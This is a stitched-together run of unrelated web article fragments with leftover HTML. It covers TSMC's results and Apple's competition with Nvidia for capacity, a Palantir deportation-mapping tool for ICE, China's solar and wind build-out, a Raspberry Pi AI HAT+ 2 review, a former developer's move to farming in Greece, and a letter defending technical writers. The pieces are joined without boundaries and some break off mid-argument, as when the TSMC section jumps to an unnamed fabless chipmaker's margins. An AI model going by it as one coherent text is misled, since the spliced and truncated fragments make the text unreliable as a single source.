In 2018 TSMC sales would have even fallen if not for incremental purchases by Apple that year. Now, the Cupertino company is posting low single-digit revenue growth while Nvidia is skyrocketing.</p><p>The reason for this change is two-fold, and pretty obvious: AI is driving massive demand for high-powered chips, while the smartphone boom has plateaued. </p><p><span>TSMC’s sales from high-performance computing, which includes AI chips, climbed 48% last year on top of 58% growth the year before. Smartphone revenue climbed just 11%, slower than 23% in the prior year.</span><span data-state="closed"><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-184494017" href="https://www.culpium.com/p/exclusiveapple-is-fighting-for-tsmc#footnote-2-184494017" target="_self" rel="">2</a></span><span> That trend will continue this year, and for the foreseeable future.</span></p><p>Revenue in 2026 will rise close to 30%, yet capital expenditure will climb around 32% to a record of somewhere between $52 billion and $56 billion, TSMC said Thursday. Longer term, growth will average 25% in the five years through 2029 yet the AI segment will climb an average of 55% or more over the same period, the company said. That’s higher than a prior forecast for a mid-40 percent figure.</p><p>The ultimate flex for TSMC came Thursday when it showed off not only record revenue and net income, but a gross margin approaching that of software makers and fabless chip designers. In the December quarter, that figure was an astounding 62.3%, 280 basis points higher than the prior period. If not for its overseas fabs (Arizona and Japan) gross margin would have been even higher.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!J4zY!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!J4zY!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 424w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 848w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 1272w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!J4zY!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png" width="1456" height="785" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/dd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png&quot;,&quot;srcNoWatermark&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/1ebe39a3-42ac-457e-9fa9-d4d3a8b48fb4_2425x1307.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:785,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:389692,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.culpium.com/i/184494017?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ebe39a3-42ac-457e-9fa9-d4d3a8b48fb4_2425x1307.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!J4zY!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 424w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 848w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 1272w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>There are two caveats that are important. First, while smartphone processors are the largest portion of chips bought by Apple, they’re not the only type. Processors for Macs come under HPC, while it also has a strong lineup of custom chips used in accessories which fall under digital consumer electronics. Second, Nvidia isn’t the only HPC client. AMD is a major buyer of capacity for its own GPUs while Amazon and Google are on the growing list of customers developing in-house AI chips.</p><p>Put another way, Apple’s chip catalog is broader and more varied, while Nvidia’s lineup is more concentrated around a huge number of wafers at, or near, leading-edge. It’s for these reasons that Apple will remain important for at least another decade.</p><p>In the near-term, however, TSMC’s technology roadmap coupled with broader industry trends favor Nvidia, AMD and their ilk, meaning Apple may need to keep fighting for capacity over the next year or two. </p><p>TSMC is already producing chips in volume at 2 nanometer (called N2), currently its most advanced node, with Apple a major buyer. But in the second half of this year it’s set to ramp up both a new variant called N2P as well as a new node called A16. </p><p><span>The company’s business model is a little quirky. Instead of repurposing an existing factory for new technology, TSMC just builds a new one. This ensures no interruption to output and allows it to squeeze the most out of old tools and processes. In general, this means any new capacity that TSMC builds is for a new node. As a result, it has numerous fabs still churning out chips on technology that’s a decade older or more.</span><span data-state="closed"><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-184494017" href="https://www.culpium.com/p/exclusiveapple-is-fighting-for-tsmc#footnote-3-184494017" target="_self" rel="">3</a></span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!CHPp!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!CHPp!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 424w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 848w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 1272w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!CHPp!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png" width="1456" height="683" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png&quot;,&quot;srcNoWatermark&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/349cdf18-9651-4c1f-9d5e-569352323bf2_1920x900.jpeg&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:683,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:531378,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.culpium.com/i/184494017?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F349cdf18-9651-4c1f-9d5e-569352323bf2_1920x900.jpeg&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!CHPp!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 424w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 848w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 1272w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>In TSMC CEO CC Wei’s words A16, with Super Power Rail, is “best for HPC with complex signal routes.” SPR is TSMC’s version of backside power, a newer approach designed to separate a chip’s signal from its power supply. Intel is also developing this technology, and many believe it’ll be the key to the US company’s prospects at stealing foundry share from its Taiwan rival.</p><p><span>After that, TSMC has A14 which it expects to bring into volume production around 2028. Some call this the next full node after N2, labeling A16 as not a “full node.” In truth, all of these names are as much marketing terms as they are technology designators. Nevertheless, as SemiAnalysis recently wrote in </span><a href="https://newsletter.semianalysis.com/p/apple-tsmc-the-partnership-that-built" rel="">a fabulous report on the TSMC-Apple relationship,</a><span> the balance will shift back to Apple because A14 is designed “for both mobile and HPC from the start.”</span></p><p>More importantly, what Apple offers is stability. Nvidia has been a client for a lot longer than Apple, but broadly speaking it’s a bit niche. Right now that “niche” is the hottest product on the planet, but niche it is. Apple, on the other hand, has products being made in no fewer than a dozen TSMC fabs.

Capital intensity was just 2.5% for 2024, while depreciation was only 5.7% of the cost of revenue. As a fabless chipmaker, it can enjoy gross margins of over 70%. Its only real risk is holding excess inventory. Even then, it could have written off its entire inventory at the end of October and still maintain a gross margin approaching that of its chief supplier. What’s more, neither of these clients have anywhere near the customer-concentration risk of TSMC.</p><p>The complaint that TSMC could and should build faster ignores the fact that it’s the one left holding the baby if a downturn comes and demand falls. It takes two to three years to build a new fab, Wei explained, so the company must skate where the puck is going without thinking too much about where it’s been. “Even if we spend 52 to 56 billion this year, the contribution this year is none,“ Wei said Thursday. Its major cost, buying equipment, remains on the books no matter what revenue it brings in for the quarter. </p><p>For the best part of a decade, Apple was the one driving TSMC’s need to keep spending on new facilities. Today it’s Nvidia, and Jensen Huang is starting to wield more power than Tim Cook. But neither has to bother with the expensive business of actually manufacturing semiconductors, merely the hassle of begging CC Wei for wafers.</p><p><span>For such clients, the foundry’s capacity is a fixed cost that they needn’t worry about.

<p>Palantir is working on a tool for Immigration and Customs Enforcement (ICE) that populates a map with potential deportation targets, brings up a dossier on each person, and provides a “confidence score” on the person’s current address, 404 Media has learned. ICE is using it to find locations where lots of people it might detain could be based.&nbsp;</p><p>The findings, based on internal ICE material obtained by 404 Media, public procurement records, and recent sworn testimony from an ICE official, show the clearest link yet between the technological infrastructure Palantir is building for ICE and the agency’s activities on the ground. The tool receives peoples’ addresses from the Department of Health and Human Services (HHS) among a range of other sources, according to the material.</p><div><p>💡</p><p><b><strong>Do you know anything else about this tool?

  <p>Last year China installed more than half of all wind and solar added globally. In May alone, it added enough renewable energy to power Poland, installing solar panels at a rate of roughly 100 every second.</p><p>The massive buildout is happening across the country, from crowded eastern cities increasingly topped by rooftop solar panels to remote western deserts where colossal wind farms sprawl across the landscape.</p><p>“From the ground, it’s hard to grasp the scale of these power plants,” <a href="https://www.greenpeace.org/international/story/79654/powering-change-a-visual-journey-into-chinas-green-transition/">said Chinese photographer</a> Weimin Chu. “But when you rise into the air, you can see the geometry, the rhythm — and their relationship with the mountains, the desert, the sea.”</p><p>Chu has spent three years capturing the shift underway using drones to photograph power plants from overhead. His work, which draws from the visual language of traditional Chinese <a href="https://en.wikipedia.org/wiki/Shan_shui">ink paintings</a>, was featured last year in an award-winning exhibition, presented by Greenpeace. A selection of those photos is reproduced here.</p><p>“I started out just shooting landscapes,” Chu said. “But when I traveled to places like Guizhou, Yunnan, and Qinghai in 2022, I kept seeing wind farms and solar power plants appear in my camera frame. I realized this is the story of our time — and almost no one is documenting it in a systematic way.”</p>

<div id="readability-page-1" class="page"><section><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/raspberry-pi-ai-hat-2.jpg" alt="Raspberry Pi AI HAT+ 2" width="700" height="auto"></figure><p>Today Raspberry Pi launched their new <a href="https://www.raspberrypi.com/products/ai-hat-plus-2/">$130 AI HAT+ 2</a> which includes a Hailo 10H and 8 GB of <a href="https://www.micron.com/products/memory/dram-components/lpddr4/part-catalog/part-detail/mt53e2g32d4de-046-wt-c">LPDDR4X RAM</a>.</p><p>With that, the Hailo 10H is capable of running LLMs entirely standalone, freeing the Pi's CPU and system RAM for other tasks. The chip runs at a maximum of 3W, with 40 TOPS of INT8 NPU inference performance in addition to the equivalent 26 TOPS INT4 machine vision performance on the earlier AI HAT with Hailo 8.</p><p>In practice, it's not as amazing as it sounds.</p><p>You still can't upgrade the RAM on the Pi, but at least this way if you <em>do</em> have a need for an AI coprocessor, you don't have to eat up the Pi's memory to run things on it.</p><p>And it's a lot cheaper and more compact than <a href="https://www.jeffgeerling.com/blog/2025/big-gpus-dont-need-big-pcs/">running an eGPU on a Pi</a>. In that sense, it's more useful than the silly NPUs Microsoft forces into their 'AI PCs'.</p><p>But it's still a solution in search of a problem, in all but the most niche of use cases.</p><p>Besides feeling like I'm living in the world of the <a href="https://www.youtube.com/watch?v=Ac7G7xOG2Ag">Turbo Encabulator</a> every time I'm testing AI hardware, I find the marketing of these things to be very vague, and the applications not very broad.</p><p>For example, the Hailo 10H is advertised as being used for a <a href="https://www.youtube.com/watch?v=flD-WfJ4pUg">Fujitsu demo of automatic shrink detection for a self-checkout</a>.</p><p>That's certainly not a worthless use case, but it's not something I've ever needed to do. I have a feeling this board is meant more for development, for people who want to deploy the 10H in other devices, rather than as a total solution to problems individual Pi owners need to solve.</p><p>Especially when it comes to the headline feature: running inference, like with LLMs.</p><h2 id="video">Video</h2><p>I also published a video with all the information in this blog post, but if you enjoy text more than video, scroll on past—it doesn't offend me!</p><div><p><iframe src="https://www.youtube.com/embed/jRQaur0LdLE" frameborder="0" allowfullscreen=""></iframe></p></div><h2 id="llm-performance-on-the-ai-hat-2">LLM performance on the AI HAT+ 2</h2><p>I ran everything on an 8 gig Pi 5, so I could get an apples-to-apples comparison, running the same models on the Pi's CPU as I did on the AI HAT's NPU.</p><p>They both have the same 8GB LPDDR4X RAM configuration, so <em>ideally</em>, they'd have similar performance.</p><p>I tested every model Hailo put out so far, and compared them, Pi 5 versus Hailo 10H:</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/pi-ai-hat-2-llm-compare-inference.jpg" alt="Raspberry Pi AI HAT+ 2 - Inference performance NPU vs CPU" width="700" height="auto"></figure><p>The Pi's built-in CPU trounces the Hailo 10H.</p><p>The Hailo is only close, really, on Qwen2.5 Coder 1.5B.</p><p>It <em>is</em> slightly more efficient in most cases:</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/pi-ai-hat-2-llm-compare-efficiency.jpg" alt="Raspberry Pi AI HAT+ 2 - Inference efficiency NPU vs CPU" width="700" height="auto"></figure><p>But looking more closely at power draw, we can see why the Hailo doesn't keep up:</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/pi-ai-hat-2-power-draw-compare-llm.jpg" alt="Raspberry Pi AI HAT+ 2 - Power draw NPU vs CPU" width="700" height="auto"></figure><p>The Pi's CPU is allowed to max out it's power limits (10W on the SoC), which are a lot higher than the Hailo's (3W).</p><h2 id="qwen-30b-on-a-pi">Qwen 30B on a Pi</h2><p>So power holds it back, but the 8 gigs of RAM holds back the LLM use case (vs just running on the Pi's CPU) the most. The Pi 5 can be bought in up to a <em>16 GB</em> configuration. That's as much as you get in decent consumer graphics cards<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p><p>Because of that, many quantized medium-size models target 10-12 GB of RAM usage (leaving space for context, which eats up another 2+ GB of RAM).</p><p>A couple weeks ago, <a href="https://byteshape.com/blogs/Qwen3-30B-A3B-Instruct-2507/">ByteShape got Qwen3 30B A3B Instruct to fit on a 16GB Pi 5</a>. Now this post isn't about LLMs, but the short of it is they found a novel way to compress the model to fit in 10 GB of RAM.</p><p>A little bit of quality is lost, but like a JPEG, it's still good enough to ace all the contrived tests (like building a TODO list app, or sorting a complex list) that the tiny models I ran on the Hailo 10H didn't complete well (see the video earlier in this post for details).</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/llama-cpp-pi-5-qwen3-30b-a3b-instruct.jpg" alt="Raspberry Pi 16GB running Qwen3 30B model" width="700" height="auto"></figure><p>To test the 30B model, I <a href="https://www.jeffgeerling.com/blog/2024/llms-accelerated-egpu-on-raspberry-pi-5/">installed llama.cpp following this guide from my blog</a>, and <a href="https://huggingface.co/byteshape/Qwen3-30B-A3B-Instruct-2507-GGUF/">downloaded the compressed model</a>.</p><p>I asked it to generate a single page TODO list app, and it's still not a speed demon (this is a Pi CPU with LPDDR4x RAM we're talking about), but after a little while, it gave me this:</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/pi-ai-16gb-qwen3-30b-todo-list-app.jpg" alt="Raspberry Pi 16GB Qwen3 Generated TODO list app" width="700" height="auto"></figure><p>It met all my requirements:</p><ul><li>I can type in as many items as I want</li><li>I can drag them around to rearrange them</li><li>I can check off items and they go to the bottom of the list...</li></ul><p>It's honestly crazy how many small tasks you can do even with free local models... even on a Pi. <a href="https://en.wikipedia.org/wiki/Natural_language_programming">Natural Language Programming</a> was just a dream back when I started my career.</p><p>Besides being angry Google, OpenAI, Anthropic and all these other companies are <a href="https://am.jpmorgan.com/us/en/asset-management/adv/insights/market-insights/market-updates/on-the-minds-of-investors/is-ai-already-driving-us-growth/">consuming all the world's money and resources</a> doing this stuff—not to mention <a href="https://www.cio.com/article/4062024/demand-for-junior-developers-softens-as-ai-takes-over.html">destroying the careers of thousands of junior developers</a>—it is kinda neat to see NLP work for very tightly defined examples.</p><h2 id="benchmarking-computer-vision">Benchmarking computer vision</h2><p>But I don't think this HAT is the best choice to run local, private LLMs (at least not as a primary goal).</p><p>What it <em>is</em> good for, is vision processing.

At least with Raspberry Pi's track record, the software <em>does</em> come, it's just... often the solutions are only useful in tiny niche use cases.</p><h2 id="conclusion">Conclusion</h2><p>8 GB of RAM is useful, but it's not quite enough to give this HAT an advantage over just paying for the bigger 16GB Pi with more RAM, which will be more flexible and run models faster.</p><p>The main use case for this HAT might be in power-constrained applications where you need both vision processing <em>and</em> inferencing. But even there... it's hard to say "yes, buy this thing", because for just a few more watts, the Pi could achieve better performance for inference in tandem with the $70 <a href="https://www.raspberrypi.com/products/ai-camera/">AI Camera</a> or the $110 <a href="https://www.microcenter.com/product/687346/product?src=raspberrypi">AI HAT+</a> for the vision processing.</p><p>Outside of running tiny LLMs in less than 10 watts, maybe the idea is you use the AI HAT+ 2 as a development kit for designing devices using the 10H like self-checkout scanners (which might not even run on a Pi)? I'm not sure.</p></section></div>]]></description>

<p>HAVE TAKEN UP FARMING</p>
<p>My name is Dylan Araps and I used to be a software engineer, best known for my
open source work (Neofetch, Pywal, KISS Linux, Pure Bash Bible) [<a href="#0">0</a>]. In 2021,
without explanation and without telling anyone, I vanished from the internet.
My usage of the internet became strictly "read only".</p>
<p>In 2024, I appeared briefly to tell the world I retired and had "taken up
farming" [<a href="#1">1</a>]. The vagueness of my message and strangeness surrounding its
circumstances created a lot of buzz. It is not every day a person in a cushy,
intellectual career drops everything and pivots to working outdoors with their
body. It was amusing to read the theories people came up with: from driving a
tractor up and down massive tracts of land to being holed up in a
Kaczynskiesque cabin in the woods.</p>
<p>Today, I return to the internet to tell my story and announce <a href="https://wild.gr/">https://WILD.gr</a>.</p>
<p>For nearly a decade I spent the majority of my waking hours sedentary and
staring at a screen. Praised for my work ethic, quick response to messages and
sheer number of projects, I was seen as a wizard. People loved what I was doing
and I in turn wanted to please them. Chasing attention led to my projects
becoming more complex and bigger in scope over time. It became increasingly
difficult to maintain them and keep up the wizard persona.</p>
<p>This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and
in constant pain with a chronic cough from years of smoking among many issues.
Abusing substances to sleep and others to wake up and unable to exert myself
for more than a few seconds before running out of breath. My diet consisted of
meat, potatoes, junk food and little else. Everything around me was in a state
of decay from neglect, and the worse life became, the deeper the descent into
my work. </p>
<p>In the end things reached a breaking point and I started experiencing burn out.
This was beyond simply needing some time away. Recovering, getting back to work
and soon after burning out again, this cycle continued and got progressively
worse until I couldn't work any longer. Many hours were spent sitting at the
computer unable to put anything on the screen. My brain was fried.</p>
<p>This culminated in an existential crisis where I asked myself: "What am I doing
with my life?". The realization? All I was doing day after day, year after year
was making the lights on the screen light up a little different and in the
process killing myself, to do it as effectively and efficiently as possible.</p>
<p>Unable to work any longer, I stopped and abandoned all effort. This then is the
cause of my disappearance from the internet. When life gives you signs that you
need to make a change, it's best you listen sooner rather than later. Ignored
for too long, life forces the change and as it's forced it comes at the worst
time attached with a lot of pain.</p>
<p>Stopping left a massive void. Without the 16+ hour days lost in computer code,
I didn't know what else to do. Eventually, I turned to reading books and bought
myself a kindle. I jailbroke it, filled it with public domain ebooks and spent
all my time reading. Not much of a reader before this, I had the entire world
of literature to choose from.</p>
<p>Everything I read made reference to the Bible, something I had never read nor
was in any way acquainted with. The references kept appearing and eventually I
decided to dive in head first and read it. Putting the King James Version of
the Bible on my kindle, over many months I read it cover to cover.</p>
<p>At the time, I wouldn't have called myself an Atheist. Agnostic is not the
right word to use either. Not that I believed or didn't believe in the
existence of God, in truth, I had simply never thought about it. In place of an
answer was lack of the preceding question.</p>
<p>I finished reading the Bible. It resonated with me in a way nothing else had
before. A mirror was put in front of me and I saw myself clearly for the first
time. Finding God, I realized how far I had drifted from the straight and
narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of
fancy, the life I led could only lead to one place: the broad road alongside
the liars, thieves, fornicators, murderers and cheats, for I was one of them.</p>
<p>No longer lost and with new found purpose, I set out to return to the straight
and narrow. Knowing how I got here and where I had to go, I set out to change
my life. Over the next three years I became a different person. One by one I
quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana,
caffeine, sugar, pornography, masturbation, gaming and processed food. For the
first time in my life I gained control over myself.</p>
<p>For reasons of spirituality, morality and health, I stopped eating all animal
products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great
grandparents: Plants; local, seasonal and whole. From eating only potatoes to
eating <i>everything</i>. I ate figs for the first time and then proceeded to make
up for all the years spent <i>not</i> eating them.</p>
<p>From home I took up calisthenics, yoga and barefoot running (the real kind, 
without shoes) and slowly reversed every postural problem and muscle imbalance 
created over the years. I regained my vitality.</p>
<p>As a result, my sleep/wake cycle, chronic cough, headaches and other issues
resolved and I no longer felt like an old man. All that remained was to decide
what to do with my life. From a spiritual perspective, there are only two
career paths one can take: farmer or artisan. Anything else unavoidably
involves doing evil or is essentially meaningless.</p>
<p>I chose the path of farmer and to be more precise, "Natural Farmer". A vampire 
for so long, I needed to work outside in the sunshine with my hands. My family 
(brother, mother, grandmother) and I set out to acquire land and embark on this 
new endeavour together. In the village of Amphithea on the Greek island of 
Euboea (<i>sidenote: In 2018, my family and I moved from Australia to Greece.</i>) 
we found a small abandoned and neglected estate complete with house, vineyard 
and olive trees. We called this venture WILD and thus began our life as farmers.</p>
<p>When I said "have taken up farming" [<a href="#1">1</a>]. This is what I meant. I'm not growing 
corn and soybeans on 100 acres of land while spraying roundup and other poisons 
and no, there's no manifesto decrying the system written from a cabin in the 
woods. There's just me and my family in a sleepy Greek village producing Natural 
food and living according to Nature. Welcome to <a href="https://wild.gr/">https://WILD.gr</a>.</p>

<div id="readability-page-1" class="page"><section>
			<p>Hey you,</p>
<p>Yes, you, who are thinking about not hiring a technical writer this year or, worse, erased one or more technical writing positions last year <em>because of AI</em>. You, who are buying into the promise of docs entirely authored by LLMs without expert oversight or guidance. You, who unloaded the weight of docs on your devs’ shoulders, as if it was a trivial chore.</p>
<p>You are making a big mistake. But you can still undo the damage.</p>
<p>It’s been a complicated year, 2025. When even Andrej Karpathy, one of OpenAI’s founders, <a href="https://x.com/karpathy/status/2004607146781278521">admits, in a fit of Oppenheimerian guilt, to feeling lost</a>, you know that no one holds the key to the future. You flail and dance around these new totems made of words, which are neither intelligent nor conscious, pretending they can replace humans while, in fact, they’re little more than glorified tools.</p>
<p>You might think that the plausible taste of AI prose is all you need to give your products a <em>voice</em>. You paste code into a field and something that resembles docs comes out after a few minutes. Like a student eager to turn homework in, you might be tempted to content yourself with <a href="https://passo.uno/ai-wikis-docs-teather-as-a-service/">docs theatre</a>, thinking that it’ll earn you a good grade. It won’t, because docs aren’t just artifacts.</p>
<blockquote>
<p>You keep using that word. I do not think it means what you think it means</p>
<p>—The Princess Bride</p>
</blockquote>
<p>When you say “docs”, you’re careful to focus on the output, omitting the process. Perhaps you don’t know how docs are produced. You’ve forgotten, or perhaps never knew, that docs are <a href="https://passo.uno/circles-product-truth/">product truth</a>; that without them, software becomes unusable, because software is never done, is never obvious, and is never simple. Producing those docs requires tech writers.</p>
<p>Tech writers go to great lengths to get the information they need. They write so that your audience can understand. They hunger for clarity and meaning and impact. They power through weeks full of deadlines, chasing product news, because without their reporting, most products wouldn’t thrive; some wouldn’t even exist. Their docs aren’t a byproduct: they tie the product together.</p>
<p>An LLM can’t do all that, because it can’t feel the pain of your users. It can’t put itself into their shoes. It lacks the kind of <a href="https://lizargall.github.io/blog/emotional-intelligence">empathy</a> that’s behind great help content. It does not, in fact, have any empathy at all, because it cannot care. You need folks who will care, because content is a hairy beast that can only be tamed by agents made of flesh and capable of emotions: humans.</p>
<h2 id="ai-generated-docs-are-broken">AI generated docs are broken</h2>
<p>You can’t generate docs on autopilot. Let me tell you why.</p>
<p>First, AI-generated docs <a href="https://passo.uno/whats-wrong-ai-generated-docs/">are not intelligent</a>. They not only make up things in subtle ways: They lack vision. Even if you fed them millions of tokens, they couldn’t develop a docs strategy, decide what not to document, or structure content for reuse. And they fail to capture the tension, the caveats, the edge cases, the feeling of unfinishedness that only someone who cares can feel. Without that grounding, docs are hollow.</p>
<p>Second, <a href="https://www.tcworld.info/e-magazine/technical-writing/why-ai-wont-replace-tech-writers-but-will-reshape-their-work">liability doesn’t vanish</a> just because AI wrote it. When docs cause harm through wrong instructions, someone will be held responsible. It won’t be the model. You can’t depose an LLM. You can’t fire it. You can’t point at it in court when a customer’s data evaporates because your GenAI runbook told them to run the wrong command. That someone will be <em>you</em>, or someone who reports to you.</p>
<p>Third, even your favorite AI <a href="https://passo.uno/from-tech-writers-to-ai-context-curators/">must RTFM</a>. All your Claude Skills, Cursor rules, all the semantic tagging that makes RAG work, is technical writing under a new name: context curation. You fired or didn’t hire the people who create high-quality context and then wondered why your AI tools produce slop. You can’t augment what isn’t there. The writers you let go were the supply chain for the intelligence you’re now betting on.</p>
<h2 id="the-solution-is-to-augment-your-technical-writers">The solution is to augment your technical writers</h2>
<p>It’s not all bad news: Marvelous things can happen if you provide your writers with AI tools and training while you protect the quality of your content through an <a href="https://passo.uno/ai-docs-policy-contributions/">AI policy</a>. I’ve described the ideal end state in <a href="https://passo.uno/my-day-tech-writer-2030/">My day as an augmented technical writer in 2030</a>, a vision of the future where writers orchestrate, edit, and publish docs together with AI agents. This is already happening before our eyes.</p>
